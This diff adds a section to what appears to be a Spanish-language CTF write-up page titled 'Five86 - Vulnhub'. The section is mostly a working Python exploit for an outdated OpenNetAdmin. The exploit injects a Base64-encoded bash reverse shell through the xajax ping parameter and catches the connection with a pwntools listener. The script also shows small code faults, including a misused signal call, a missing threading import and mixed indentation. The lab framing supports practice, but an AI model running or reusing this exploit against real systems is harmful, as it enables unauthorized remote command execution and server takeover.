@@ -1,8 +1,90 @@
 ---
 layout: content
 ---
-
 <p> </p>
+
+<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Five86 - Vulnhub</h2>
+<p> </p>
+
+Este código aprovecha una versión desactualizada de **OpenNetAdmin** para enviar una petición maliciosa al servidor codificando una *reverse shell* en Base64 y ganando acceso mediante una consola interactiva.
+
+* Consola interactiva
+* OpenNetAdmin
+* Testeo de servidor
+
+```python
+#!/usr/bin/python3 
+
+from pwn import *
+import requests
+from signal import signal
+from dataclasses import dataclass 
+from sys import exit
+from base64 import b64encode
+
+def def_handler(sig,frame):
+    print('Saliendo...')
+    exit(1)
+
+signal(signal.SIGINT, def_handler)
+
+# burp = {'http':'http://127.0.0.1:8080'} Proxy para analizar petición
+
+@dataclass # Uso de decorador para ahorrar código
+class Exploit:
+    url: str
+    cmd: str
+
+    def base64encode(self): # Función para codificar shell inverso en base64
+        global cmd_encoded
+        cmd_encoded = b64encode(self.cmd.encode('utf-8')).decode('utf-8')
+    
+    def send_request_rce(self): # Función para enviar petición al servidor
+	p1 = log.progress(f'Status Code [{self.url}]')
+        try: # Manejo verificación de estado, esperado: 200 OK
+            r = requests.get(self.url, timeout=15)
+            if r.status_code == 200:
+                p1.success(str(r.status_code))
+                
+                p2 = log.progress('Request')
+
+                data_post = {
+                    'xajax': 'window_submit',
+                    'xajaxr': '1574117726710',
+                    'xajaxargs[]': ['tooltips', 'ip=>;echo "BEGIN";echo ' + cmd_encoded + ' | base64 -d | bash;echo "END"', 'ping']
+                }               
+
+                try: # Manejo de excepciones para la petición
+                    r = requests.post(self.url, data=data_post)
+                    r.raise_for_status() 
+                except requests.exceptions.RequestException as e:
+                    p2.failure(e)
+                except KeyboardInterrupt:
+                    p2.failure('Cancelado...')
+
+            else:
+                p1.failure(str(r.status_code))
+        except requests.exceptions.Timeout:
+            p1.failure('Timeout')
+        except requests.exceptions.RequestException as e:
+            p1.failure(str(e))
+
+
+autopwn = Exploit("http://192.168.1.139/ona/", "sh -i >& /dev/tcp/192.168.1.136/443 0>&1")
+                          # ↑ Cambiar IP (Victim)                   ↑ Cambiar IP (Host)
+def main():
+    autopwn.base64encode()
+    autopwn.send_request_rce()
+
+if __name__ == '__main__':
+    try:
+        threading.Thread(target=main, args=()).start()
+    except Exception as e:
+        log.error(str(e))
+
+shell = listen(443, timeout=60).wait_for_connection()
+shell.interactive()
+```
 
 <h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Catch - HackTheBox</h2>
 
